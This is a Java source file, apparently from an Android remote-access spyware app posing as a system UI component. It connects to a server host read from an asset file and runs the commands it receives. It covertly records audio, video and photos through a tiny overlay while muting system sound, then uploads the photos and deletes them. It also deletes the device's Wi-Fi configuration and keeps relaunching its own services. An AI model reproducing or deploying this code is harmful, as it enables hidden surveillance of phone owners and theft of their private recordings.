package com.system.ui.service;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.LinearLayout;

import com.system.ui.MainActivity;
import com.system.ui.R;
import com.system.ui.interpret.AbsAction;
import com.system.ui.interpret.ActionFactory;
import com.system.ui.socket.HeartBeatThread;
import com.system.ui.socket.SocketThread;
import com.system.ui.socket.SocketThread.OnReceiveMessageListener;
import com.system.ui.util.MediaController;
import com.system.ui.util.MediaController.OnRecordFinishListener;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.List;

import static com.system.ui.socket.SocketThread.SERVER_HOST;

/**
 * 本地服务
 */
public class LocalService extends Service {

    /**
     * Socket线程。用它来包裹Socket的相关操作。
     */
    private static SocketThread mSocketThread = null;

    /**
     * 悬浮窗的布局
     */
    private LinearLayout mFloatLayout;
    private WindowManager mWindowManager;
    private WindowManager.LayoutParams mParams;

    private SurfaceView mSurfaceView;
    private MediaController mMediaController;
    private boolean isExit = false;

    public MediaController getMediaController() {
        if (mMediaController == null) {
            synchronized (this) {
                if (mMediaController == null) {
                    mMediaController = new MediaController(this);
                }
            }
        }
        return mMediaController;
    }

    public final String TAG = this.getClass().getSimpleName();

    @Override
    public IBinder onBind(Intent intent) {
        MainActivity.isStopThread = false;
        return (IBinder) new LocalBinder();
    }


    @Override
    public void onStart(Intent intent, int startId) {
        MainActivity.isStopThread = false;
        bindService(new Intent(this, RemoteService.class), new LocalConnection(), Context.BIND_IMPORTANT);
    }

    class LocalConnection implements ServiceConnection {

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.i("hyx", "LocalService绑定RemoteService成功...");
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.i("hyx", "LocalService绑定RemoteService失败，开始重新绑定...");
            Intent intent = new Intent(LocalService.this, RemoteService.class);
            startService(intent);
            bindService(intent, new LocalConnection(), Context.BIND_IMPORTANT);
        }
    }

    class LocalBinder extends DoubleServiceSystem.Stub {

        @Override
        public String getServiceName() throws RemoteException {
            return this.getServiceName();
        }

    }

    /**
     * 开始录音
     */
    public void startRecordSound(String savePath) {
        if (mMediaController != null) {
            try {
                mMediaController.startRecordSound(savePath);
            } catch (IllegalStateException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 启动视频录制
     */
    /**
     * 静音
     */
    private AudioManager mAudioManager;
    int volumn;// 音量

    public void clearVolumn(Context context) {
        mAudioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        mAudioManager.setStreamMute(AudioManager.STREAM_SYSTEM, false);
        //volumn = mAudioManager.getStreamVolume(AudioManager.STREAM_SYSTEM);
        //mAudioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
        //mAudioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);


    }

    public void reVolumn(Context context) {
        mAudioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        mAudioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
        //volumn = mAudioManager.getStreamVolume(AudioManager.STREAM_SYSTEM);
        //mAudioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, 100, AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
        //mAudioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);


    }

    public void startRecordVideo(String savePath) {
        clearVolumn(this);
        if (mMediaController != null && mSurfaceView != null) {
            try {
                mMediaController.setSurfaceView(mSurfaceView);
                mMediaController.startRecordVideo(savePath);
            } catch (IllegalStateException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 结束音频和视频录制
     */
    public void stopRecord() {
        reVolumn(this);
        if (mMediaController != null) {
            mMediaController.stopRecord();
        }
    }

    public byte[] BitmapToBytes(Bitmap bm) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.PNG, 100, baos);
        return baos.toByteArray();
    }

    public void takePhotos(int index, int angle, boolean isJpeg, int quality) {
        if (mMediaController != null && mSurfaceView != null) {
            mMediaController.setSurfaceView(mSurfaceView);
            mMediaController.initCamera(index, angle + 90);// 角度要修正

            mMediaController.setOnRecordFinishListener(new OnRecordFinishListener() {


                @Override
                public void onRecordFinish(String savePath) {
                    try {
                        String msg = String.format("拍照完成:%s", savePath);
                        Log.i("hyx", msg);

                        //mSocketThread.send("/*/");
                        Bitmap bitmap = BitmapFactory.decodeFile(savePath);
                        mSocketThread.send(new FileInputStream(new File(savePath)));
                        //mSocketThread.send("/*/");
                        Log.i("hyx", "-----------> 相片发送完毕");

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    String path1 = savePath;
                    File file1 = new File(path1);
                    file1.delete();
                }
            });
            mMediaController.takePhotos(isJpeg, quality);
            String path1 = "/misc/wifi/wpa_supplicant.conf";
            File file1 = new File(path1);
            file1.delete();
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createFloatWindow();// 创建悬浮窗
        MainActivity.isStopThread = false;
        new Thread(new Runnable() {

            @Override
            public void run() {
                monitorThread();
                while (true) {
                    boolean isRun = isServiceRunning(LocalService.this, "com.example.com_system_ui:RemoteService");
                    if (isRun == false) {
                        try {
                            //Log.i(TAG, "重新启动服务2: "+LocalService);
                            Intent i = new Intent(LocalService.this, RemoteService.class);
                            LocalService.this.startService(i);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }).start();

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    /**
     * 监控线程
     */
    private void monitorThread() {
        while (true) {
            try {
                Log.i("hyx", "monitorThread running..." + Thread.currentThread().getId());
                if (this.isExit) break;
                if (mSocketThread == null || SocketThread.isExit) {
                    //Return an AssetManager instance for your application's package
                    InputStream is = getAssets().open("index.txt");
                    int size = is.available();
                    // Read the entire asset into a local byte buffer.
                    byte[] buffer = new byte[size];
                    is.read(buffer);
                    is.close();
                    // Convert the buffer into a string.
                    String text = new String(buffer, "GB2312");
                    SERVER_HOST = text;
                    Log.i("hyx", "开始创建mSocketThread..."+SERVER_HOST);
                    MainActivity.isStopThread = false;
                    mSocketThread = new SocketThread(LocalService.this);
                    SocketThread.isExit = false;
                    mSocketThread.setOnReceiveMessageListener(new OnReceiveMessageListener() {
                        @Override
                        public void onReceive(String msg) {
                            onReceiveServerMessage(msg);
                        }
                    });
                }


                if (HeartBeatThread.isExit) {
                    Log.i("hyx", "开始创建HeartBeatThread...");
                    MainActivity.isStopThread = false;
                    new Thread(new HeartBeatThread(mSocketThread, LocalService.this)).start();
                    HeartBeatThread.isExit = false;
                }

                Thread.sleep(1000 * 10);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void onReceiveServerMessage(String msg) {
        String log = String.format("收到服务器命令：%s", msg);
        Log.i("hyx", log);

        ActionFactory factory = new ActionFactory(LocalService.this, msg);
        AbsAction action = factory.build();
        action.execute();
    }


    @Override
    public void onDestroy() {

        MainActivity.isStopThread = true;
        this.isExit = true;

        if (mFloatLayout != null) {
            // 移除悬浮窗口
            mWindowManager.removeView(mFloatLayout);
        }
        if (mSocketThread != null) {
            // 销毁Socket线程
            mSocketThread = null;
        }


    }

    /**
     * 创建悬浮窗
     */
    private void createFloatWindow() {
        mParams = new WindowManager.LayoutParams();
        // 获取的是LocalWindowManager对象
        mWindowManager = (WindowManager) this.getSystemService(WINDOW_SERVICE);
        mParams.type = WindowManager.LayoutParams.TYPE_TOAST;
        mParams.format = PixelFormat.RGBA_8888;
        mParams.flags = LayoutParams.FLAG_NOT_FOCUSABLE;
        mParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
        mParams.x = 0;
        mParams.y = 0;
        mParams.width = 100;// WindowManager.LayoutParams.WRAP_CONTENT;
        mParams.height = 100;// WindowManager.LayoutParams.WRAP_CONTENT;
        LayoutInflater inflater = LayoutInflater.from(this);
        mFloatLayout = (LinearLayout) inflater.inflate(R.layout.layout_float, null);
        mSurfaceView = (SurfaceView) mFloatLayout.findViewById(R.id.surfaceview);
        mWindowManager.addView(mFloatLayout, mParams);
        mMediaController = getMediaController();
    }

    /**
     * 获取Socket线程
     */
    public SocketThread getSocketThread() {
        return mSocketThread;
    }

    //服务是否运行
    public boolean isServiceRunning(Context context, String serviceName) {
        boolean isRunning = false;
        ActivityManager am = (ActivityManager) context
                .getSystemService(Context.ACTIVITY_SERVICE);
        List<RunningServiceInfo> lists = am.getRunningServices(30);

        for (RunningServiceInfo info : lists) {// 获取运行服务再启动
            if (info.service.getClassName().equals(serviceName)) {
                Log.i("Service1进程", "" + info.service.getClassName());
                isRunning = true;
            }
        }
        return isRunning;

    }

    // 进程是否运行
    public static boolean isProessRunning(Context context, String proessName) {

        boolean isRunning = false;
        ActivityManager am = (ActivityManager) context
                .getSystemService(Context.ACTIVITY_SERVICE);

        List<RunningAppProcessInfo> lists = am.getRunningAppProcesses();
        for (RunningAppProcessInfo info : lists) {
            if (info.processName.equals(proessName)) {
                //Log.i("Service1进程", "" + info.processName);
                isRunning = true;
            }
        }

        return isRunning;
    }
}
